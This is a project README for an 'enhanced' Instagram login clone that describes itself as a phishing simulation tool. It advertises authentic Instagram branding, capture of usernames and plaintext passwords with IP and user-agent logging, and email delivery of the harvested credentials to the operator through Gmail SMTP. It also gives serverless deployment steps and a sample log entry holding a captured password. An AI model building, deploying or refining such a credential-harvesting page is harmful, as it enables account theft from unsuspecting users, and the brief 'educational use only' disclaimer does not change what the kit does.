# Instagram Login Clone - Enhanced Version

🔐 **Enhanced Instagram Login Page** - A sophisticated phishing simulation tool for educational and security testing purposes.

## ✨ Features

### 🎨 **Enhanced UI/UX**
- **Dark Mode Design** - Modern Instagram-inspired dark theme
- **Responsive Layout** - Perfect on all devices (mobile, tablet, desktop)
- **Loading Animations** - Smooth loading overlay and transitions
- **Real-time Validation** - Instant feedback on form inputs
- **Password Toggle** - Show/hide password functionality
- **Arabic Localization** - Full Arabic language support

### 🔒 **Security & Monitoring**
- **Rate Limiting** - Prevents spam attempts
- **Enhanced Logging** - Detailed attempt logs with IP, User-Agent, etc.
- **Email Alerts** - Beautiful HTML email notifications
- **Input Sanitization** - Secure data handling
- **Security Headers** - XSS protection and content security

### 📧 **Advanced Email System**
- **Rich HTML Emails** - Professional security alert templates
- **Detailed Information** - IP, User-Agent, Timestamp, Referer
- **Instagram Branding** - Authentic-looking email design
- **Automatic Logging** - File-based backup logging system

### 🚀 **Performance & Deployment**
- **Vercel Optimized** - Ready for serverless deployment
- **Fast Loading** - Optimized assets and lazy loading
- **Error Handling** - Comprehensive error management
- **Production Ready** - Environment-specific configurations

## 🛠️ **Technology Stack**

- **Backend**: Node.js + Express.js
- **Frontend**: HTML5, CSS3, Vanilla JavaScript
- **Email**: Nodemailer with Gmail SMTP
- **Deployment**: Vercel Serverless Functions
- **Styling**: Custom CSS with animations and transitions

## 📦 **Installation**

```bash
# Clone the repository
git clone https://github.com/nlvxv/Instagram.git
cd Instagram

# Install dependencies
npm install

# Start development server
npm start
```

## 🌐 **Deployment to Vercel**

1. **Install Vercel CLI**:
   ```bash
   npm i -g vercel
   ```

2. **Deploy**:
   ```bash
   vercel --prod
   ```

3. **Configure Environment Variables** (if needed):
   - Set up email credentials in Vercel dashboard
   - Configure any additional environment variables

## ⚙️ **Configuration**

### Email Setup
Update the email configuration in `server.js`:

```javascript
const transporter = nodemailer.createTransporter({
  service: 'gmail',
  auth: {
    user: 'your-email@gmail.com',
    pass: 'your-app-password'
  }
});
```

### Rate Limiting
Adjust rate limiting settings in `server.js`:

```javascript
// Current: 10 attempts per IP
if (attempts > 10) {
  // Rate limit logic
}
```

## 📱 **Features Overview**

### Frontend Enhancements
- ✅ Modern dark theme matching Instagram's design
- ✅ Responsive design for all screen sizes
- ✅ Loading animations and smooth transitions
- ✅ Real-time form validation
- ✅ Password visibility toggle
- ✅ Error handling with user-friendly messages
- ✅ Arabic language support
- ✅ App download section
- ✅ Enhanced accessibility features

### Backend Improvements
- ✅ Rate limiting to prevent abuse
- ✅ Enhanced security headers
- ✅ Detailed logging system
- ✅ Beautiful HTML email templates
- ✅ IP and user agent tracking
- ✅ Error handling middleware
- ✅ Vercel serverless optimization

## 🔧 **API Endpoints**

### `POST /api/login`
Handles login attempts and sends email notifications.

**Request Body**:
```json
{
  "username": "user@example.com",
  "password": "userpassword"
}
```

**Response**:
```json
{
  "success": true,
  "message": "تم تسجيل الدخول بنجاح"
}
```

## 📊 **Logging System**

The application logs all attempts to `login_attempts.log`:

```json
{
  "timestamp": "2025-01-13T10:30:00.000Z",
  "username": "user@example.com",
  "password": "userpassword",
  "ip": "192.168.1.1",
  "userAgent": "Mozilla/5.0...",
  "referer": "https://example.com"
}
```

## 🎯 **Use Cases**

- **Security Testing** - Test organization's security awareness
- **Educational Purposes** - Demonstrate phishing techniques
- **Penetration Testing** - Authorized security assessments
- **Research** - Study user behavior and security patterns

## ⚠️ **Legal Disclaimer**

This tool is for **educational and authorized testing purposes only**. Users are responsible for:

- Obtaining proper authorization before use
- Complying with local laws and regulations
- Using the tool ethically and responsibly
- Not using it for malicious purposes

## 🤝 **Contributing**

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 **License**

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🔗 **Links**

- **Repository**: https://github.com/nlvxv/Instagram
- **Issues**: https://github.com/nlvxv/Instagram/issues

## 📞 **Support**

For support, email nlvx.v7@gmail.com or create an issue on GitHub.

---

**⭐ Star this repository if you found it helpful!**

*Built with ❤️ for educational and security testing purposes*

